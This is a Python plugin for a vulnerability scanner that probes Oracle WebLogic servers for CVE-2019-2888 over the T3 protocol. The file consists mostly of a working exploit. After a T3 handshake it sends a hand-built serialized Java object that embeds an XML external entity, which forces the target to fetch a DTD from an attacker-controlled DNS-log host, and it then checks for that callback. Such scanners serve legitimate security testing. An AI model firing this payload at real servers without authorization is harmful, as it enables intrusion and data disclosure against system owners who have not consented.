#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2019-2888，该请求无响应信息
# updated 2019/10/23
# referer: https://github.com/jas502n/CVE-2019-2888/tree/master

import pathlib
import socket
import sys
import time
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return {
            'name': 'Oracle WebLogic Server TFA Collectorjackson-databind Information Disclosure',
            'catalog': 'CVE-2019-2888',
            'itype': PLUGIN_TYPE.MODULE,
            'protocols': ['t3'],
            'port': '7001',
        }

    def run(self, url: urlutil.Url, timeout=5, echo_netloc='127.0.0.1:8080', *args, **kwargs) -> Tuple[bool, Any]:
        # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
        try:
            self.tcp.connect()
        except socket.timeout:
            return False, 'connection timeout.'
        except ConnectionRefusedError:
            return False, 'connection refuse.'
        # t3 handshake
        err, _ = self.tcp.rq(b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n', timeout=timeout)
        if err:
            return False, err

        info = self.make_dns_echo()
        if not info:
            return False, 'requires dns type reflection.'
        host = '{}.{}'.format(info['rid'], info['netloc'])
        # build t3 request object
        data = (
            b'\x04\x1a<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://'
            + host.encode()
            + b'/ext.dtd">%aaa;%ccc;%ddd;]>/www.bea.com/servers/wls600/dtd/weblogic-ejb2jsp.dtd">\n<ejb2jsp-taglib>\n  <filesystem-info>\n    <javac-path></javac-path>\n    <javac-flags></javac-flags>\n    <compile-classpath>\n    </compile-classpath>\n    <keepgenerated>false</keepgenerated>\n    <source-path>\n    </source-path>\n    <package-name></package-name>\n    <ejb-jar-file></ejb-jar-file>\n    <save-as></save-as>\n    <save-taglib-jar>\n      <tmpdir></tmpdir>\n      <taglib-jar-file></taglib-jar-file>\n    </save-taglib-jar>\n    <save-taglib-directory>\n      <classes-directory></classes-directory>\n      <tld-file></tld-file>\n    </save-taglib-directory>\n  </filesystem-info>\n  <ejb>\n    <ejb-name></ejb-name>\n    <remote-type></remote-type>\n    <home-type></home-type>\n    <jndi-name></jndi-name>\n    <ejb-type></ejb-type>\n    <enabled>true</enabled>\n    <ejb-methods>\n    </ejb-methods>\n    <home-methods>\n    </home-methods>'
        )
        data = (
            b'\x01e\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00q\x00\x00\xea`\x00\x00\x00\x18C.\xc6\xa2\xa69\x85\xb5\xaf}c\xe6C\x83\xf4*m\x92\xc9\xe9\xaf\x0f\x94r\x02ysr\x00xr\x01xr\x02xp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00pppppp\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00p\x06\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitlet\x00\x12Ljava/lang/String;L\x00\nimplVendorq\x00~\x00\x03L\x00\x0bimplVersionq\x00~\x00\x03xpw\x02\x00\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00/weblogic.servlet.ejb2jsp.dd.EJBTaglibDescriptor\x82\xde\xd27\x16\xd9\xccy\x0c\x00\x00xpz\x00\x00'
            + len(data).to_bytes(2, 'big')
            + data
            + b'w\x1c\n  </ejb>\n</ejb2jsp-taglib>\nx\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x1dweblogic.rjvm.ClassTableEntry/Re\x81W\xf4\xf9\xed\x0c\x00\x00xpr\x00!weblogic.common.internal.PeerInfoXTt\xf3\x9b\xc9\x08\xf1\x02\x00\x07I\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatch[\x00\x08packagest\x00\'[Lweblogic/common/internal/PackageInfo;xr\x00$weblogic.common.internal.VersionInfo\x97"EQdRF>\x02\x00\x03[\x00\x08packagesq\x00~\x00\x03L\x00\x0ereleaseVersiont\x00\x12Ljava/lang/String;[\x00\x12versionInfoAsBytest\x00\x02[Bxr\x00$weblogic.common.internal.PackageInfo\xe6\xf7#\xe7\xb8\xae\x1e\xc9\x02\x00\tI\x00\x05majorI\x00\x05minorI\x00\x0bpatchUpdateI\x00\x0crollingPatchI\x00\x0bservicePackZ\x00\x0etemporaryPatchL\x00\timplTitleq\x00~\x00\x05L\x00\nimplVendorq\x00~\x00\x05L\x00\x0bimplVersionq\x00~\x00\x05xpw\x02\x00\x00x\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpwF!\x00\x00\x00\x00\x00\x00\x00\x00\x00\t127.0.1.1\x00\x0bus-l-breens\xa5<\xaf\xf1\x00\x00\x00\x07\x00\x00\x1bY\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00x\xfe\x01\x00\x00\xac\xed\x00\x05sr\x00\x13weblogic.rjvm.JVMID\xdcI\xc2>\xde\x12\x1e*\x0c\x00\x00xpw\x1d\x01\x81@\x12\x814\xbfBv\x00\t127.0.1.1\xa5<\xaf\xf1\x00\x00\x00\x00\x00x'
        )
        payload = (len(data) + 4).to_bytes(4, 'big') + data
        err, _ = self.tcp.rq(payload, timeout=timeout)
        if err:
            return False, err

        result_echo = self.get_results(info['rid'])
        return len(result_echo) > 0, result_echo


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['is_exists'])
    print('total time(s):', time.time() - s_time)
